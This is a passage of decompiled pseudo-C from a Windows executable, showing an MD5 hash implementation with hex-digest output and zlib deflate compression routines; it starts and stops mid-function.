  unsigned int v53; // edx
  unsigned int v54; // eax
  unsigned int v55; // edi
  unsigned int v56; // ecx
  unsigned int v57; // eax
  __int64 v58; // kr20_8
  int v59; // ecx
  unsigned int v60; // edx
  int v61; // ebx
  unsigned int v62; // edx
  int v63; // edi
  unsigned int v64; // eax
  int v65; // edx
  unsigned int v66; // ecx
  int v67; // eax
  unsigned int v68; // ebx
  unsigned int v69; // ebp
  unsigned int v70; // edi
  unsigned int v71; // ebx
  unsigned int v72; // edx
  unsigned int v73; // ecx
  unsigned int v74; // eax
  unsigned int v75; // ebp
  unsigned int v76; // edi
  unsigned int v77; // ebx
  unsigned int v78; // ecx
  unsigned int v79; // eax
  unsigned int v80; // edx
  unsigned int v81; // edi
  unsigned int v82; // ebx
  unsigned int v83; // ecx
  unsigned int v84; // edx
  unsigned int v85; // eax
  int v86; // ecx
  int v87; // edx
  int v88; // edi
  int v89; // eax
  int result; // eax
  int v91; // [esp+10h] [ebp-50h] BYREF
  int v92; // [esp+14h] [ebp-4Ch] BYREF
  int v93; // [esp+18h] [ebp-48h] BYREF
  int v94; // [esp+1Ch] [ebp-44h] BYREF
  int v95; // [esp+20h] [ebp-40h] BYREF
  int v96; // [esp+24h] [ebp-3Ch]
  int v97; // [esp+28h] [ebp-38h]
  int v98; // [esp+2Ch] [ebp-34h]
  int v99; // [esp+30h] [ebp-30h]
  int v100; // [esp+34h] [ebp-2Ch]
  int v101; // [esp+38h] [ebp-28h]
  int v102; // [esp+3Ch] [ebp-24h]
  int v103; // [esp+40h] [ebp-20h]
  int v104; // [esp+44h] [ebp-1Ch]
  int v105; // [esp+48h] [ebp-18h]
  int v106; // [esp+4Ch] [ebp-14h]
  int v107; // [esp+50h] [ebp-10h]
  int v108; // [esp+54h] [ebp-Ch]
  int v109; // [esp+58h] [ebp-8h]
  int v110; // [esp+5Ch] [ebp-4h]

  v3 = this[21];
  v4 = this[19];
  v92 = this[20];
  v93 = v3;
  v91 = v4;
  v94 = this[22];
  sub_404140((int)&v95, a2, 0x40u);
  v5 = (unsigned __int64)(v91 + v95 + (v92 & v93 | v94 & (unsigned int)~v92) - 680876936) << 7;
  v6 = v92 + (v5 | HIDWORD(v5));
  v7 = (unsigned __int64)(v94 + v96 + (v6 & v92 | v93 & (unsigned int)~v6) - 389564586) << 12;
  v8 = v6 + (v7 | HIDWORD(v7));
  v9 = (unsigned __int64)(v93 + v97 + (v6 & v8 | v92 & (unsigned int)~v8) + 606105819) << 17;
  v10 = v8 + (v9 | HIDWORD(v9));
  v92 = v10
      + (((v92 + v98 + (v10 & v8 | v6 & (unsigned int)~v10) - 1044525330) >> 10) | ((v92
                                                                                   + v98
                                                                                   + (v10 & v8 | v6 & ~v10)
                                                                                   - 1044525330) << 22));
  v11 = v6 + v99 + (v92 & v10 | v8 & ~v92) - 176418897;
  v12 = v92 + ((v11 << 7) | (v11 >> 25));
  v13 = v8 + v100 + (v12 & v92 | v10 & ~v12) + 1200080426;
  v14 = v12 + ((v13 << 12) | (v13 >> 20));
  v15 = v10 + v101 + (v12 & v14 | v92 & ~v14) - 1473231341;
  v16 = v14 + ((v15 << 17) | (v15 >> 15));
  v92 = v16
      + (((v92 + v102 + (v16 & v14 | v12 & (unsigned int)~v16) - 45705983) >> 10) | ((v92
                                                                                    + v102
                                                                                    + (v16 & v14 | v12 & ~v16)
                                                                                    - 45705983) << 22));
  v17 = v12 + v103 + (v92 & v16 | v14 & ~v92) + 1770035416;
  v18 = v92 + ((v17 << 7) | (v17 >> 25));
  v19 = v14 + v104 + (v18 & v92 | v16 & ~v18) - 1958414417;
  v20 = v18 + ((v19 << 12) | (v19 >> 20));
  v21 = v16 + v105 + (v18 & v20 | v92 & ~v20) - 42063;
  v22 = v20 + ((v21 << 17) | (v21 >> 15));
  v92 = v22
      + (((v92 + v106 + (v22 & v20 | v18 & (unsigned int)~v22) - 1990404162) >> 10) | ((v92
                                                                                      + v106
                                                                                      + (v22 & v20 | v18 & ~v22)
                                                                                      - 1990404162) << 22));
  v23 = v18 + v107 + (v92 & v22 | v20 & ~v92) + 1804603682;
  v24 = v92 + ((v23 << 7) | (v23 >> 25));
  v25 = v20 + v108 + (v24 & v92 | v22 & ~v24) - 40341101;
  v26 = v24 + ((v25 << 12) | (v25 >> 20));
  v27 = v22 + v109 + (v24 & v26 | v92 & ~v26) - 1502002290;
  v28 = v26 + ((v27 << 17) | (v27 >> 15));
  v29 = v28
      + (((v110 + (v28 & v26 | v24 & (unsigned int)~v28) + v92 + 1236535329) >> 10) | ((v110
                                                                                      + (v28 & v26 | v24 & ~v28)
                                                                                      + v92
                                                                                      + 1236535329) << 22));
  v30 = v24 + v96 + (v29 & v26 | v28 & ~v26) - 165796510;
  v31 = v29 + ((32 * v30) | (v30 >> 27));
  v32 = v26 + v101 + (v31 & v28 | v29 & ~v28) - 1069501632;
  v33 = v31 + ((v32 << 9) | (v32 >> 23));
  v34 = v28 + v106 + (v29 & v33 | v31 & ~v29) + 643717713;
  v35 = v33 + ((v34 << 14) | (v34 >> 18));
  v36 = v29 + v95 + (v31 & v35 | v33 & ~v31) - 373897302;
  v37 = v35 + ((v36 >> 12) | (v36 << 20));
  v38 = v31 + v100 + (v37 & v33 | v35 & ~v33) - 701558691;
  v39 = v105 + ((v37 + ((32 * v38) | (v38 >> 27))) & v35 | v37 & ~v35);
  v40 = v37 + ((32 * v38) | (v38 >> 27));
  v41 = v40 + (((v33 + v39 + 38016083) << 9) | ((unsigned int)(v33 + v39 + 38016083) >> 23));
  v42 = v110 + (v37 & v41 | v40 & ~v37);
  v43 = v41 + (((v35 + v42 - 660478335) << 14) | ((unsigned int)(v35 + v42 - 660478335) >> 18));
  v44 = v37 + v99 + (v40 & v43 | v41 & ~v40) - 405537848;
  v45 = v43 + ((v44 >> 12) | (v44 << 20));
  v46 = v40 + v104 + (v45 & v41 | v43 & ~v41) + 568446438;
  v91 = v45 + ((32 * v46) | (v46 >> 27));
  v47 = v91
      + (((v41 + v109 + (v91 & v43 | v45 & ~v43) - 1019803690) << 9) | ((v41
                                                                       + v109
                                                                       + (v91 & v43 | v45 & (unsigned int)~v43)
                                                                       - 1019803690) >> 23));
  v48 = v43 + v98 + (v45 & v47 | v91 & ~v45) - 187363961;
  v49 = v47 + ((v48 << 14) | (v48 >> 18));
  v50 = v45 + v103 + (v91 & v49 | v47 & ~v91) + 1163531501;
  v51 = v49 + ((v50 >> 12) | (v50 << 20));
  v52 = 32i64 * (v91 + v108 + (v51 & v47 | v49 & (unsigned int)~v47) - 1444681467);
  v91 = v51 + (v52 | HIDWORD(v52));
  v53 = v91
      + (((v47 + v97 + (v91 & v49 | v51 & ~v49) - 51403784) << 9) | ((v47
                                                                    + v97
                                                                    + (v91 & v49 | v51 & (unsigned int)~v49)
                                                                    - 51403784) >> 23));
  v54 = v49 + v102 + (v51 & v53 | v91 & ~v51) + 1735328473;
  v55 = v53 + ((v54 << 14) | (v54 >> 18));
  v56 = v51 + v107 + (v91 & v55 | v53 & ~v91) - 1926607734;
  v57 = v55 + ((v56 >> 12) | (v56 << 20));
  v58 = 16i64 * (v91 + v100 + (v57 ^ v55 ^ v53) - 378558);
  v59 = v57 + (v58 | HIDWORD(v58));
  v60 = v53 + v103 + (v59 ^ v57 ^ v55) - 2022574463;
  v61 = v59 + ((v60 << 11) | (v60 >> 21));
  v62 = v55 + v106 + (v59 ^ v57 ^ v61) + 1839030562;
  v63 = v61 + ((v62 << 16) | HIWORD(v62));
  v64 = v57 + v109 + (v59 ^ v63 ^ v61) - 35309556;
  v65 = v63 + ((v64 >> 9) | (v64 << 23));
  v66 = v59 + v96 + (v65 ^ v63 ^ v61) - 1530992060;
  v67 = v65 + ((16 * v66) | (v66 >> 28));
  v68 = v61 + v99 + (v67 ^ v65 ^ v63) + 1272893353;
  v69 = v67 + ((v68 << 11) | (v68 >> 21));
  v70 = v63 + v102 + (v67 ^ v65 ^ v69) - 155497632;
  v71 = v69 + ((v70 << 16) | HIWORD(v70));
  v72 = v65 + v105 + (v67 ^ v71 ^ v69) - 1094730640;
  v73 = v71 + ((v72 >> 9) | (v72 << 23));
  v74 = v73
      + ((16 * (v67 + v108 + (v73 ^ v71 ^ v69) + 681279174)) | ((v67 + v108 + (v73 ^ v71 ^ v69) + 681279174) >> 28));
  v75 = v95 + (v74 ^ v73 ^ v71) + v69 - 358537222;
  v76 = v74 + ((v75 << 11) | (v75 >> 21));
  v77 = v76
      + (((v71 + v98 + (v74 ^ v73 ^ v76) - 722521979) << 16) | ((v71 + v98 + (v74 ^ v73 ^ v76) - 722521979) >> 16));
  v78 = v77 + (((v73 + v101 + (v74 ^ v77 ^ v76) + 76029189) >> 9) | ((v73 + v101 + (v74 ^ v77 ^ v76) + 76029189) << 23));
  v79 = v74 + v104 + (v78 ^ v77 ^ v76) - 640364487;
  v80 = v78 + ((16 * v79) | (v79 >> 28));
  v81 = v80
      + (((v76 + v107 + (v80 ^ v78 ^ v77) - 421815835) << 11) | ((v76 + v107 + (v80 ^ v78 ^ v77) - 421815835) >> 21));
  v82 = v81
      + (((v77 + v110 + (v80 ^ v78 ^ v81) + 530742520) << 16) | ((v77 + v110 + (v80 ^ v78 ^ v81) + 530742520) >> 16));
  v83 = v78 + v97 + (v80 ^ v82 ^ v81) - 995338651;
  v92 = v82 + ((v83 >> 9) | (v83 << 23));
  v84 = v80 + v95 + (v82 ^ (v92 | ~v81)) - 198630844;
  v91 = v92 + ((v84 << 6) | (v84 >> 26));
  v94 = v91
      + (((v81 + v102 + (v92 ^ (v91 | ~v82)) + 1126891415) << 10) | ((v81 + v102 + (v92 ^ (v91 | ~v82)) + 1126891415) >> 22));
  v85 = v82 + v109 + (v91 ^ (v94 | ~v92)) - 1416354905;
  v93 = v94 + ((v85 << 15) | (v85 >> 17));
  sub_404B60(&v92, v93, v94, v91, v100, 21, -57434055);
  sub_404B60(&v91, v92, v93, v94, v107, 6, 1700485571);
  sub_404B60(&v94, v91, v92, v93, v98, 10, -1894986606);
  sub_404B60(&v93, v94, v91, v92, v105, 15, -1051523);
  sub_404B60(&v92, v93, v94, v91, v96, 21, -2054922799);
  sub_404B60(&v91, v92, v93, v94, v103, 6, 1873313359);
  sub_404B60(&v94, v91, v92, v93, v110, 10, -30611744);
  sub_404B60(&v93, v94, v91, v92, v101, 15, -1560198380);
  sub_404B60(&v92, v93, v94, v91, v108, 21, 1309151649);
  sub_404B60(&v91, v92, v93, v94, v99, 6, -145523070);
  sub_404B60(&v94, v91, v92, v93, v106, 10, -1120210379);
  sub_404B60(&v93, v94, v91, v92, v97, 15, 718787259);
  sub_404B60(&v92, v93, v94, v91, v104, 21, -343485551);
  v86 = v93;
  v87 = this[21];
  v88 = v92 + this[20];
  this[19] += v91;
  this[20] = v88;
  v89 = this[22];
  this[21] = v86 + v87;
  result = v94 + v89;
  this[22] = result;
  return result;
}

//----- (00404B60) --------------------------------------------------------
int __stdcall sub_404B60(int *a1, int a2, int a3, int a4, int a5, char a6, int a7)
{
  int v7; // ecx
  int result; // eax

  v7 = a7 + a5 + (a3 ^ (a2 | ~a4)) + *a1;
  *a1 = v7;
  result = v7 << a6;
  *a1 = a2 + __ROL4__(v7, a6);
  return result;
}

//----- (00404BB0) --------------------------------------------------------
void __thiscall sub_404BB0(_DWORD *this)
{
  *this = &off_41E4F8;
}
// 41E4F8: using guessed type void *(__thiscall *off_41E4F8)(std::locale::facet *__hidden this, unsigned int);

//----- (00404BE0) --------------------------------------------------------
_DWORD *__thiscall sub_404BE0(_DWORD *this)
{
  *this = &off_41E4F8;
  memset(this + 1, 0, 0x40u);
  this[18] = 0;
  this[17] = 0;
  this[19] = 1732584193;
  this[20] = -271733879;
  this[21] = -1732584194;
  this[22] = 271733878;
  return this;
}
// 41E4F8: using guessed type void *(__thiscall *off_41E4F8)(std::locale::facet *__hidden this, unsigned int);

//----- (00404C20) --------------------------------------------------------
void __stdcall sub_404C20(int a1, _BYTE *a2, unsigned int a3)
{
  _BYTE *v4; // eax
  char v5; // dl

  if ( a3 )
  {
    v4 = (_BYTE *)(a1 + 1);
    do
    {
      v5 = *a2;
      a2 += 4;
      *(v4 - 1) = v5;
      *v4 = BYTE1(*((_DWORD *)a2 - 1));
      v4[1] = BYTE2(*((_DWORD *)a2 - 1));
      v4[2] = HIBYTE(*((_DWORD *)a2 - 1));
      v4 += 4;
    }
    while ( (unsigned int)&v4[-1 - a1] < a3 );
  }
}

//----- (00404C70) --------------------------------------------------------
int __thiscall sub_404C70(int this, char *a2)
{
  _DWORD *v3; // edi
  int v4; // ecx
  unsigned int v5; // eax
  char v7; // al
  CHAR *v8; // edi
  int result; // eax
  char v10[8]; // [esp+10h] [ebp-24h] BYREF
  CHAR v11[12]; // [esp+18h] [ebp-1Ch] BYREF
  char v12[16]; // [esp+24h] [ebp-10h] BYREF
  int v13; // [esp+38h] [ebp+4h]

  v3 = (_DWORD *)(this + 68);
  sub_404C20((int)v10, (_BYTE *)(this + 68), 8u);
  v4 = 56;
  v5 = (*v3 >> 3) & 0x3F;
  if ( v5 >= 0x38 )
    v4 = 120;
  sub_404D60((_DWORD *)this, asc_4246D4, v4 - v5);
  sub_404D60((_DWORD *)this, v10, 8u);
  sub_404C20((int)v12, (_BYTE *)(this + 76), 0x10u);
  v13 = 0;
  *a2 = 0;
  do
  {
    v7 = v12[v13];
    if ( v7 )
    {
      if ( (unsigned __int8)v7 > 0xFu )
        wsprintfA(v11, "%x", (unsigned __int8)v12[v13]);
      else
        wsprintfA(v11, "0%x", (unsigned __int8)v12[v13]);
      v8 = v11;
    }
    else
    {
      v8 = a00;
    }
    strcat(a2, v8);
    result = ++v13;
  }
  while ( v13 < 16 );
  return result;
}
// 404C70: using guessed type char var_10[16];

//----- (00404D60) --------------------------------------------------------
unsigned int __thiscall sub_404D60(_DWORD *this, char *a2, unsigned int a3)
{
  unsigned int v4; // ecx
  unsigned int v5; // edx
  int v6; // eax
  unsigned int v7; // ebp
  unsigned int v8; // edi
  unsigned int i; // esi
  unsigned int v10; // ecx
  char *v11; // esi
  char *v12; // edi
  unsigned int result; // eax

  v4 = a3;
  v5 = this[17] + 8 * a3;
  v6 = (this[17] >> 3) & 0x3F;
  this[17] = v5;
  if ( v5 < 8 * a3 )
    ++this[18];
  v7 = 64 - v6;
  this[18] += a3 >> 29;
  if ( a3 < 64 - v6 )
  {
    v8 = 0;
  }
  else
  {
    qmemcpy((char *)this + v6 + 4, a2, v7);
    sub_404190(this, (int)(this + 1));
    v8 = v7;
    for ( i = v7 + 63; i < a3; v8 += 64 )
    {
      sub_404190(this, (int)&a2[i - 63]);
      i += 64;
    }
    v4 = a3;
    v6 = 0;
  }
  v10 = v4 - v8;
  v11 = &a2[v8];
  v12 = (char *)this + v6 + 4;
  result = v10;
  qmemcpy(v12, v11, v10);
  return result;
}

//----- (00404E20) --------------------------------------------------------
_DWORD *__cdecl sub_404E20(int a1)
{
  _DWORD *result; // eax
  int v2; // esi
  unsigned int v3; // edx
  int v4; // ecx
  int v5; // ecx
  unsigned int v6; // edi

  result = (_DWORD *)a1;
  v2 = *(_DWORD *)(a1 + 28);
  v3 = *(_DWORD *)(v2 + 20);
  if ( v3 > *(_DWORD *)(a1 + 16) )
    v3 = *(_DWORD *)(a1 + 16);
  if ( v3 )
  {
    qmemcpy(*(void **)(a1 + 12), *(const void **)(v2 + 16), v3);
    v4 = *(_DWORD *)(a1 + 28);
    *(_DWORD *)(a1 + 12) += v3;
    *(_DWORD *)(v4 + 16) += v3;
    v5 = *(_DWORD *)(a1 + 28);
    v6 = *(_DWORD *)(a1 + 16) - v3;
    *(_DWORD *)(a1 + 20) += v3;
    *(_DWORD *)(a1 + 16) = v6;
    *(_DWORD *)(v5 + 20) -= v3;
    result = *(_DWORD **)(a1 + 28);
    if ( !result[5] )
      result[4] = result[2];
  }
  return result;
}

//----- (00404EA0) --------------------------------------------------------
int __cdecl sub_404EA0(int *a1, int a2)
{
  int v2; // ebx
  unsigned int v3; // eax
  int v4; // ecx
  bool v5; // zf
  int v6; // ecx
  unsigned int v7; // edx
  unsigned int v8; // eax
  _BYTE *v9; // edx
  int v10; // ecx
  unsigned int v11; // edx
  _BYTE *v12; // eax
  int v13; // ecx
  _BYTE *v14; // eax
  int v16; // eax
  int v17; // [esp-14h] [ebp-20h]
  int v18; // [esp-14h] [ebp-20h]
  int v19; // [esp-14h] [ebp-20h]

  v2 = 0xFFFF;
  if ( (unsigned int)(a1[3] - 5) < 0xFFFF )
    v2 = a1[3] - 5;
  while ( 1 )
  {
    v3 = a1[27];
    if ( v3 <= 1 )
    {
      sub_405000((int)a1);
      v3 = a1[27];
      if ( !v3 )
        break;
    }
    v4 = a1[25];
    a1[27] = 0;
    v5 = v3 + v4 == 0;
    a1[25] = v3 + v4;
    v6 = a1[21];
    v7 = a1[25];
    v8 = v6 + v2;
    if ( !v5 && v7 < v8
      || ((a1[25] = v8, a1[27] = v7 - v8, v6 < 0) ? (v9 = 0) : (v9 = (_BYTE *)(v6 + a1[12])),
          sub_405CC0((int)a1, v9, v2, 0),
          v17 = *a1,
          a1[21] = a1[25],
          sub_404E20(v17),
          *(_DWORD *)(*a1 + 16)) )
    {
      v10 = a1[21];
      v11 = a1[25] - v10;
      if ( v11 < a1[9] - 262 )
        continue;
      v12 = v10 < 0 ? 0 : (_BYTE *)(v10 + a1[12]);
      sub_405CC0((int)a1, v12, v11, 0);
      v18 = *a1;
      a1[21] = a1[25];
      sub_404E20(v18);
      if ( *(_DWORD *)(*a1 + 16) )
        continue;
    }
    return 0;
  }
  if ( !a2 )
    return 0;
  v13 = a1[21];
  if ( v13 < 0 )
    v14 = 0;
  else
    v14 = (_BYTE *)(v13 + a1[12]);
  sub_405CC0((int)a1, v14, a1[25] - v13, a2 == 4);
  v19 = *a1;
  a1[21] = a1[25];
  sub_404E20(v19);
  if ( !*(_DWORD *)(*a1 + 16) )
    return a2 != 4 ? 0 : 2;
  v16 = -(a2 != 4);
  LOBYTE(v16) = v16 & 0xFE;
  return v16 + 3;
}
// 404EDE: conditional instruction was optimized away because eax.4==0

//----- (00405000) --------------------------------------------------------
int __cdecl sub_405000(int a1)
{
  unsigned int v1; // ebp
  unsigned int v2; // eax
  int v3; // ecx
  unsigned int v4; // edx
  int v5; // eax
  unsigned int v6; // ecx
  int v7; // esi
  int v8; // ecx
  _WORD *v9; // ecx
  __int16 v10; // ax
  unsigned int v11; // esi
  _WORD *v12; // ecx
  __int16 v13; // ax
  int result; // eax
  unsigned int v15; // esi
  int v16; // ecx
  unsigned __int8 *v17; // edi
  int v18; // eax

  v1 = *(_DWORD *)(a1 + 36);
  do
  {
    v2 = *(_DWORD *)(a1 + 100);
    v3 = *(_DWORD *)(a1 + 108);
    v4 = *(_DWORD *)(a1 + 52) - v2 - v3;
    if ( v4 )
    {
      if ( v4 == -1 )
      {
        v4 = -2;
        goto LABEL_20;
      }
    }
    else if ( !v2 && !v3 )
    {
      v4 = v1;
      goto LABEL_20;
    }
    if ( v2 >= *(_DWORD *)(a1 + 36) + v1 - 262 )
    {
      qmemcpy(*(void **)(a1 + 48), (const void *)(*(_DWORD *)(a1 + 48) + v1), v1);
      v5 = *(_DWORD *)(a1 + 84);
      v6 = *(_DWORD *)(a1 + 100) - v1;
      *(_DWORD *)(a1 + 104) -= v1;
      v7 = *(_DWORD *)(a1 + 68);
      *(_DWORD *)(a1 + 100) = v6;
      v8 = *(_DWORD *)(a1 + 60);
      *(_DWORD *)(a1 + 84) = v5 - v1;
      v9 = (_WORD *)(v8 + 2 * v7);
      do
      {
        if ( (unsigned __int16)*--v9 < v1 )
          v10 = 0;
        else
          v10 = *v9 - v1;
        --v7;
        *v9 = v10;
      }
      while ( v7 );
      v11 = v1;
      v12 = (_WORD *)(*(_DWORD *)(a1 + 56) + 2 * v1);
      do
      {
        if ( (unsigned __int16)*--v12 < v1 )
          v13 = 0;
        else
          v13 = *v12 - v1;
        --v11;
        *v12 = v13;
      }
      while ( v11 );
      v4 += v1;
    }
LABEL_20:
    result = *(_DWORD *)a1;
    if ( !*(_DWORD *)(*(_DWORD *)a1 + 4) )
      break;
    result = sub_405130(result, (void *)(*(_DWORD *)(a1 + 48) + *(_DWORD *)(a1 + 100) + *(_DWORD *)(a1 + 108)), v4);
    v15 = result + *(_DWORD *)(a1 + 108);
    *(_DWORD *)(a1 + 108) = v15;
    if ( v15 >= 3 )
    {
      v16 = *(_DWORD *)(a1 + 80);
      v17 = (unsigned __int8 *)(*(_DWORD *)(a1 + 100) + *(_DWORD *)(a1 + 48));
      v18 = *v17;
      *(_DWORD *)(a1 + 64) = v18;
      result = *(_DWORD *)(a1 + 76) & (v17[1] ^ (v18 << v16));
      *(_DWORD *)(a1 + 64) = result;
    }
    if ( v15 >= 0x106 )
      break;
    result = *(_DWORD *)(*(_DWORD *)a1 + 4);
  }
  while ( result );
  return result;
}

//----- (00405130) --------------------------------------------------------
unsigned int __cdecl sub_405130(int a1, void *a2, unsigned int a3)
{
  unsigned int v3; // ebx
  int v5; // eax

  v3 = *(_DWORD *)(a1 + 4);
  if ( v3 > a3 )
    v3 = a3;
  if ( !v3 )
    return 0;
  *(_DWORD *)(a1 + 4) -= v3;
  if ( !*(_DWORD *)(*(_DWORD *)(a1 + 28) + 24) )
    *(_DWORD *)(a1 + 48) = sub_405A80(*(_DWORD *)(a1 + 48), *(unsigned __int8 **)a1, v3);
  qmemcpy(a2, *(const void **)a1, v3);
  v5 = *(_DWORD *)(a1 + 8);
  *(_DWORD *)a1 += v3;
  *(_DWORD *)(a1 + 8) = v3 + v5;
  return v3;
}

//----- (004051B0) --------------------------------------------------------
int __cdecl sub_4051B0(int a1, int a2)
{
  int v2; // edi
  unsigned int v3; // eax
  int v4; // edx
  int v5; // ecx
  int v6; // eax
  char v7; // cl
  __int16 v8; // ax
  unsigned __int16 v9; // ax
  int v10; // edx
  int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // edx
  BOOL v14; // ebp
  unsigned int v15; // ecx
  int v16; // eax
  int v17; // edi
  int v18; // edx
  int v19; // ecx
  int v20; // eax
  int v21; // eax
  unsigned int v22; // ecx
  unsigned __int8 *v23; // edx
  int v24; // ecx
  int v25; // eax
  unsigned __int8 v26; // al
  int v27; // ecx
  _BYTE *v28; // eax
  int v29; // ecx
  _BYTE *v30; // eax
  int v32; // eax
  int v33; // [esp-14h] [ebp-24h]
  int v34; // [esp-14h] [ebp-24h]

  v2 = 0;
  while ( 1 )
  {
    v3 = *(_DWORD *)(a1 + 108);
    if ( v3 < 0x106 )
    {
      sub_405000(a1);
      v3 = *(_DWORD *)(a1 + 108);
      if ( v3 < 0x106 && !a2 )
        return 0;
      if ( !v3 )
        break;
    }
    if ( v3 >= 3 )
    {
      v4 = *(_DWORD *)(a1 + 100);
      v5 = *(_DWORD *)(a1 + 60);
      v6 = *(_DWORD *)(a1 + 76) & (*(unsigned __int8 *)(*(_DWORD *)(a1 + 48) + v4 + 2) ^ (*(_DWORD *)(a1 + 64) << *(_DWORD *)(a1 + 80)));
      HIWORD(v2) = 0;
      *(_DWORD *)(a1 + 64) = v6;
      LOWORD(v2) = *(_WORD *)(v5 + 2 * v6);
      *(_WORD *)(*(_DWORD *)(a1 + 56) + 2 * (v4 & *(_DWORD *)(a1 + 44))) = v2;
      *(_WORD *)(*(_DWORD *)(a1 + 60) + 2 * *(_DWORD *)(a1 + 64)) = *(_WORD *)(a1 + 100);
    }
    if ( v2 && *(_DWORD *)(a1 + 100) - v2 <= (unsigned int)(*(_DWORD *)(a1 + 36) - 262) && *(_DWORD *)(a1 + 128) != 2 )
      *(_DWORD *)(a1 + 88) = sub_4054E0((_DWORD *)a1, v2);
    if ( *(_DWORD *)(a1 + 88) < 3u )
    {
      v26 = *(_BYTE *)(*(_DWORD *)(a1 + 100) + *(_DWORD *)(a1 + 48));
      *(_WORD *)(*(_DWORD *)(a1 + 5788) + 2 * *(_DWORD *)(a1 + 5784)) = 0;
      *(_BYTE *)(*(_DWORD *)(a1 + 5776) + (*(_DWORD *)(a1 + 5784))++) = v26;
      ++*(_WORD *)(a1 + 4 * v26 + 140);
      v14 = *(_DWORD *)(a1 + 5784) == *(_DWORD *)(a1 + 5780) - 1;
      --*(_DWORD *)(a1 + 108);
    }
    else
    {
      v7 = *(_DWORD *)(a1 + 88);
      v8 = *(_WORD *)(a1 + 100) - *(_WORD *)(a1 + 104);
      *(_WORD *)(*(_DWORD *)(a1 + 5788) + 2 * *(_DWORD *)(a1 + 5784)) = v8;
      v9 = v8 - 1;
      *(_BYTE *)(*(_DWORD *)(a1 + 5776) + (*(_DWORD *)(a1 + 5784))++) = v7 - 3;
      v10 = (unsigned __int8)byte_41EDC0[(unsigned __int8)(v7 - 3)];
      ++*(_WORD *)(a1 + 4 * v10 + 1168);
      if ( v9 >= 0x100u )
        v11 = (unsigned __int8)byte_41ECC0[v9 >> 7];
      else
        v11 = (unsigned __int8)byte_41EBC0[v9];
      ++*(_WORD *)(a1 + 4 * v11 + 2432);
      v12 = *(_DWORD *)(a1 + 88);
      v13 = *(_DWORD *)(a1 + 120);
      v14 = *(_DWORD *)(a1 + 5784) == *(_DWORD *)(a1 + 5780) - 1;
      v15 = *(_DWORD *)(a1 + 108) - v12;
      *(_DWORD *)(a1 + 108) = v15;
      if ( v12 > v13 || v15 < 3 )
      {
        v22 = v12 + *(_DWORD *)(a1 + 100);
        v23 = (unsigned __int8 *)(v22 + *(_DWORD *)(a1 + 48));
        *(_DWORD *)(a1 + 100) = v22;
        v24 = *(_DWORD *)(a1 + 80);
        *(_DWORD *)(a1 + 88) = 0;
        v25 = *v23;
        *(_DWORD *)(a1 + 64) = v25;
        *(_DWORD *)(a1 + 64) = *(_DWORD *)(a1 + 76) & (v23[1] ^ (v25 << v24));
        goto LABEL_24;
      }
      *(_DWORD *)(a1 + 88) = v12 - 1;
      do
      {
        v16 = *(_DWORD *)(a1 + 48);
        v17 = *(_DWORD *)(a1 + 64);
        v18 = *(_DWORD *)(a1 + 100) + 1;
        *(_DWORD *)(a1 + 100) = v18;
        v19 = *(_DWORD *)(a1 + 60);
        v20 = *(_DWORD *)(a1 + 76) & ((v17 << *(_DWORD *)(a1 + 80)) ^ *(unsigned __int8 *)(v18 + v16 + 2));
        HIWORD(v2) = 0;
        *(_DWORD *)(a1 + 64) = v20;
        LOWORD(v2) = *(_WORD *)(v19 + 2 * v20);
        *(_WORD *)(*(_DWORD *)(a1 + 56) + 2 * (*(_DWORD *)(a1 + 44) & v18)) = v2;
        *(_WORD *)(*(_DWORD *)(a1 + 60) + 2 * *(_DWORD *)(a1 + 64)) = *(_WORD *)(a1 + 100);
        v21 = *(_DWORD *)(a1 + 88) - 1;
        *(_DWORD *)(a1 + 88) = v21;
      }
      while ( v21 );
    }
    ++*(_DWORD *)(a1 + 100);
LABEL_24:
    if ( v14 )
    {
      v27 = *(_DWORD *)(a1 + 84);
      v28 = v27 < 0 ? 0 : (_BYTE *)(*(_DWORD *)(a1 + 48) + v27);
      sub_405CC0(a1, v28, *(_DWORD *)(a1 + 100) - v27, 0);
      v33 = *(_DWORD *)a1;
      *(_DWORD *)(a1 + 84) = *(_DWORD *)(a1 + 100);
      sub_404E20(v33);
      if ( !*(_DWORD *)(*(_DWORD *)a1 + 16) )
        return 0;
    }
  }
  v29 = *(_DWORD *)(a1 + 84);
  if ( v29 < 0 )
    v30 = 0;
  else
    v30 = (_BYTE *)(v29 + *(_DWORD *)(a1 + 48));
  sub_405CC0(a1, v30, *(_DWORD *)(a1 + 100) - v29, a2 == 4);
  v34 = *(_DWORD *)a1;
  *(_DWORD *)(a1 + 84) = *(_DWORD *)(a1 + 100);
  sub_404E20(v34);
  if ( !*(_DWORD *)(*(_DWORD *)a1 + 16) )
    return a2 != 4 ? 0 : 2;
  v32 = -(a2 != 4);
  LOBYTE(v32) = v32 & 0xFE;
  return v32 + 3;
}

//----- (004054E0) --------------------------------------------------------
unsigned int __cdecl sub_4054E0(_DWORD *a1, int a2)
{
  int v3; // esi
  unsigned int v4; // edx
  unsigned int v5; // ebp
  unsigned int v6; // eax
  _BYTE *v7; // ecx
  _BYTE *v8; // ebx
  _BYTE *v10; // edx
  char v11; // al
  _BYTE *v12; // edx
  _BYTE *v13; // ecx
  _BYTE *v14; // edx
  char v15; // al
  _BYTE *v16; // edx
  char v17; // al
  _BYTE *v18; // edx
  char v19; // al
  _BYTE *v20; // edx
  char v21; // al
  _BYTE *v22; // edx
  char v23; // al
  _BYTE *v24; // edx
  char v25; // al
  _BYTE *v26; // edx
  char v27; // al
  _BYTE *v28; // edx
  char v29; // al
  _BYTE *v30; // edx
  int v31; // edx
  unsigned int result; // eax
  char v33; // [esp+13h] [ebp-11h]
  unsigned int v34; // [esp+14h] [ebp-10h]
  int v35; // [esp+18h] [ebp-Ch]
  unsigned int v36; // [esp+1Ch] [ebp-8h]
  unsigned int v37; // [esp+20h] [ebp-4h]
  char v38; // [esp+28h] [ebp+4h]

  v3 = a1[9];
  v4 = a1[25];
  v5 = a1[28];
  v34 = a1[29];
  v6 = a1[34];
  v7 = (_BYTE *)(v4 + a1[12]);
  v35 = v6;
  if ( v4 <= v3 - 262 )
    v36 = 0;
  else
    v36 = v4 - v3 + 262;
  v8 = v7 + 258;
  v38 = v7[v5 - 1];
  v33 = v7[v5];
  if ( v5 >= a1[33] )
    v34 >>= 2;
  v37 = a1[27];
  if ( v6 > v37 )
    v35 = a1[27];
  do
  {
    v10 = (_BYTE *)(a2 + a1[12]);
    if ( v10[v5] == v33 && v10[v5 - 1] == v38 && *v10 == *v7 )
    {
      v11 = v10[1];
      v12 = v10 + 1;
      if ( v11 == v7[1] )
      {
        v13 = v7 + 2;
